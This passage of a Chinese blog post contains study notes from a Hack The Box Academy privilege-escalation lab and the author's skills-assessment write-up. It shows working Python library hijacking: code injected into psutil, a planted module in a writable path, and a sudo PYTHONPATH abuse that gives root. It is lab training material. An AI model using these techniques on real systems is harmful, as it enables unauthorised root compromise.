+/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():
+
+
+htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
+
+-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
+</code></pre>
+<p>这种权限在许多开发人员使用不同脚本的开发人员环境中最为常见，并且可能需要更高的权限。</p>
+<h4 id="Module-Contents"><a href="#Module-Contents" class="headerlink" title="Module Contents"></a>Module Contents</h4><pre><code class="python">...SNIP...
+
+def virtual_memory():
+
+    ...SNIP...
+    
+    global _TOTAL_PHYMEM
+    ret = _psplatform.virtual_memory()
+    # cached for later use in Process.memory_percent()
+    _TOTAL_PHYMEM = ret.total
+    return ret
+
+...SNIP...
+</code></pre>
+<p>这是库中我们可以插入代码的部分。建议将其放在函数的开头。在那里，我们可以插入我们认为正确和有效的一切。我们可以出于测试目的导入模块操作系统，这使我们能够执行系统命令。这样，我们就可以插入命令id，并在脚本执行期间检查插入的代码是否执行。</p>
+<pre><code class="python">...SNIP...
+
+def virtual_memory():
+
+    ...SNIP...
+    #### Hijacking
+    import os
+    os.system(&#39;id&#39;)
+    
+
+    global _TOTAL_PHYMEM
+    ret = _psplatform.virtual_memory()
+    # cached for later use in Process.memory_percent()
+    _TOTAL_PHYMEM = ret.total
+    return ret
+
+...SNIP...
+</code></pre>
+<h4 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h4><pre><code class="shell-session">htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py
+
+uid=0(root) gid=0(root) groups=0(root)
+uid=0(root) gid=0(root) groups=0(root)
+Available memory: 79.22%
+</code></pre>
+<p>成功正如我们从上面的结果中看到的那样，我们成功地劫持了库，并使virtual_memory（）函数中的代码以root身份运行。现在我们已经得到了所需的结果，我们可以再次编辑库，但这一次，插入一个以root身份连接到主机的反向shell。</p>
+<h2 id="Library-Path"><a href="#Library-Path" class="headerlink" title="Library Path"></a>Library Path</h2><p>在Python中，每个版本都有指定的搜索和导入库（模块）的顺序。Python从中导入模块的顺序基于优先级系统，这意味着列表中较高的路径优先于列表中较低的路径。我们可以通过发出以下命令来看到这一点：</p>
+<pre><code class="shell-session">htb-student@lpenix:~$ python3 -c &#39;import sys; print(&quot;\n&quot;.join(sys.path))&#39;
+
+/usr/lib/python38.zip
+/usr/lib/python3.8
+/usr/lib/python3.8/lib-dynload
+/usr/local/lib/python3.8/dist-packages
+/usr/lib/python3/dist-packages
+</code></pre>
+<p>为了能够使用这个变体，两个先决条件是必要的。 脚本导入的模块位于通过PYTHONPATH变量列出的一个优先级较低的路径下。 我们必须对列表中优先级较高的路径之一具有写入权限。</p>
+<p>因此，如果导入的模块位于列表中较低的路径中，并且较高优先级的路径可由我们的用户编辑，我们可以自己创建一个具有相同名称的模块，并包含我们自己想要的功能。由于优先级较高的路径会更早读取并检查有问题的模块，因此Python会访问它找到的第一个命中，并在到达原始和预期模块之前将其导入。 为了让这一点更有意义，让我们继续前面的例子，并展示如何利用这一点。以前，psutil模块被导入到mem_stats.py脚本中。我们可以通过发出以下命令来查看psutil的默认安装位置：</p>
+<h4 id="Psutil-Default-Installation-Location"><a href="#Psutil-Default-Installation-Location" class="headerlink" title="Psutil Default Installation Location"></a>Psutil Default Installation Location</h4><pre><code class="shell-session">htb-student@lpenix:~$ pip3 show psutil
+
+...SNIP...
+Location: /usr/local/lib/python3.8/dist-packages
+
+...SNIP...
+</code></pre>
+<p>从这个例子中，我们可以看到psutil安装在以下路径中：&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;dist-packages。从我们之前列出的PYTHONPATH变量中，我们有合理数量的目录可供选择，以查看环境中是否存在任何错误配置，从而允许我们对其中任何目录进行写访问。让我们检查一下。</p>
+<h4 id="Misconfigured-Directory-Permissions"><a href="#Misconfigured-Directory-Permissions" class="headerlink" title="Misconfigured Directory Permissions"></a>Misconfigured Directory Permissions</h4><pre><code class="shell-session">htb-student@lpenix:~$ ls -la /usr/lib/python3.8
+
+total 4916
+drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
+...SNIP...
+</code></pre>
+<p>在检查了列出的所有目录后，&#x2F;usr&#x2F;lib&#x2F;python3.8路径的配置似乎不正确，任何用户都可以对其进行写入。通过与PYTHONPATH变量中的值进行交叉检查，我们可以看到该路径在列表中的位置高于安装psutil的路径。让我们尝试滥用这种错误配置，在&#x2F;usr&#x2F;lib&#x2F;python3.8目录中创建我们自己的psutil模块，该模块包含我们自己的恶意virtual_memory（）函数。</p>
+<h4 id="Hijacked-Module-Contents-psutil-py"><a href="#Hijacked-Module-Contents-psutil-py" class="headerlink" title="Hijacked Module Contents - psutil.py"></a>Hijacked Module Contents - psutil.py</h4><pre><code class="python">#!/usr/bin/env python3
+
+import os
+
+def virtual_memory():
+    os.system(&#39;id&#39;)
+</code></pre>
+<p>为了达到这一点，我们需要创建一个名为psutil.py的文件，该文件包含前面提到的目录中列出的内容。非常重要的是，我们要确保我们创建的模块与导入具有相同的名称，并且具有与我们打算劫持的函数相同的函数，并向其传递正确数量的参数。这一点至关重要，因为如果这两种情况都不成立，我们将无法进行这次攻击。在创建了包含上一个劫持脚本示例的文件之后，我们已经成功地为利用该系统做好了准备。 让我们再次像前面的例子一样使用sudo运行mem_status.py脚本。</p>
+<pre><code class="shell-session">htb-student@lpenix:~$ sudo /usr/bin/python3 mem_stats.py
+
+uid=0(root) gid=0(root) groups=0(root)
+Traceback (most recent call last):
+  File &quot;mem_stats.py&quot;, line 4, in &lt;module&gt;
+    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
+AttributeError: &#39;NoneType&#39; object has no attribute &#39;available&#39; 
+</code></pre>
+<h2 id="PYTHONPATH-Environment-Variable"><a href="#PYTHONPATH-Environment-Variable" class="headerlink" title="PYTHONPATH Environment Variable"></a>PYTHONPATH Environment Variable</h2><p>在上一节中，我们谈到了术语PYTHONPATH，但是，并没有完全解释它的使用和关于Python功能的重要性。PYTHONPATH是一个环境变量，指示Python可以搜索要导入的模块的目录。这一点很重要，因为如果允许用户在运行python二进制文件时操作和设置此变量，那么在导入模块时，他们可以有效地将python的搜索功能重定向到用户定义的位置。我们可以通过检查我们的sudo权限来查看我们是否有权限为python二进制文件设置环境变量：</p>
+<h4 id="Checking-sudo-permissions"><a href="#Checking-sudo-permissions" class="headerlink" title="Checking sudo permissions"></a>Checking sudo permissions</h4><pre><code class="shell-session">htb-student@lpenix:~$ sudo -l 
+
+Matching Defaults entries for htb-student on ACADEMY-LPENIX:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User htb-student may run the following commands on ACADEMY-LPENIX:
+    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
+</code></pre>
+<p>正如我们从示例中看到的那样，我们可以在sudo的可信权限下运行&#x2F;usr&#x2F;bin&#x2F;python3，因此可以通过设置SETENV:标志来设置环境变量，以便与该二进制文件一起使用。值得注意的是，由于sudo的可信性质，在调用二进制文件之前定义的任何环境变量都不受任何关于能够在系统上设置环境变量的限制。这意味着使用&#x2F;usr&#x2F;bin&#x2F;python3二进制文件，我们可以在运行程序的上下文中有效地设置任何环境变量。现在让我们使用上一节中的psutil.py脚本来尝试这样做。</p>
+<pre><code class="shell-session">htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_stats.py
+
+uid=0(root) gid=0(root) groups=0(root)
+...SNIP...
+</code></pre>
+<p>在本例中，我们将上一个python脚本从&#x2F;usr&#x2F;lib&#x2F;python3.8目录移动到&#x2F;tmp。从这里开始，我们再次调用&#x2F;usr&#x2F;bin&#x2F;python3来运行mem_stats.py，但是，我们指定PYTHONPATH变量包含&#x2F;tmp目录，以便它强制Python搜索该目录以查找要导入的psutil模块。正如我们所看到的，我们再次成功地在root上下文下运行了我们的脚本。</p>
+<h1 id="Skills-Assessment"><a href="#Skills-Assessment" class="headerlink" title="Skills Assessment"></a>Skills Assessment</h1><blockquote>
+<p>我们已签约对INLANEFREIGHT组织的一个面向公众的网络服务器进行安全强化评估。 客户端为我们提供了一个低特权用户来评估服务器的安全性。通过SSH连接，并使用本模块中学到的技能开始查找可能会提升权限的错误配置和其他缺陷。 一旦进入主机，我们必须在主机上找到五个标志，这些标志可以在不同的权限级别访问。将权限从htb学生用户一直提升到根用户，并提交所有五个标志来完成本模块。 注意：如果您想让场景更具挑战性，有一种方法可以在盒子上获得shell，而不是使用SSH凭据。这是可选的，不会奖励更多的分数或计入完成。</p>
+</blockquote>
+<p>根据提示所说，目测他应该有一个网站，简单扫描了一下，它使用了wordpress5.5.1，搜索了一下有一些漏洞，然后在8080端口有一个webadmin链接，需要登陆，这里简单探索了一下，先不深究。</p>
+<p>这里通过信息搜集发现在系统内核版本和sudo版本都存在漏洞，但是主机不允许跟github通信，通过其他方法把exp脚本传过去，我这里使用的是本机搭建一个服务器，然后：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307181333205.png" alt="image-20230718133304072"></p>
+<p>很奇怪，第一个flag找不到？这里先用新学到的方法一次性读取一下找到的flag：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307181335994.png" alt="image-20230718133545934"></p>
+<p>查看了一下他给的提示，让彻底枚举整个目录，猜想可能是隐藏文件，果然：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307181342618.png" alt="image-20230718134212561"></p>
+<p>这里根据他给出的路径顺序其实也暗示了我们平时可能拿到敏感信息的地方：</p>
+<p>当前用户目录下的隐藏文件，就拿这道题来说还是能从用户目录下读到不少敏感信息</p>
+<pre><code>htb-student@nix03:~$ ls -al
+total 36
+drwxr-xr-x 4 htb-student htb-student 4096 Jul 18 05:08 .
+drwxr-xr-x 5 root        root        4096 Sep  6  2020 ..
+-rw------- 1 htb-student htb-student   57 Sep  6  2020 .bash_history
+-rw-r--r-- 1 htb-student htb-student  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 htb-student htb-student 3771 Feb 25  2020 .bashrc
+drwx------ 2 htb-student htb-student 4096 Sep  6  2020 .cache
+drwxr-xr-x 2 root        root        4096 Sep  6  2020 .config
+-rw-r--r-- 1 htb-student htb-student  807 Feb 25  2020 .profile
+-rw------- 1 htb-student htb-student  676 Jul 18 05:08 .viminfo
+</code></pre>
+<p>然后就是&#x2F;home路径下其他的用户文件、&#x2F;log系统日志文件、&#x2F;…&#x2F;tomcat9&#x2F;系统启动的服务器目录 、&#x2F;root即管理员目录等</p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
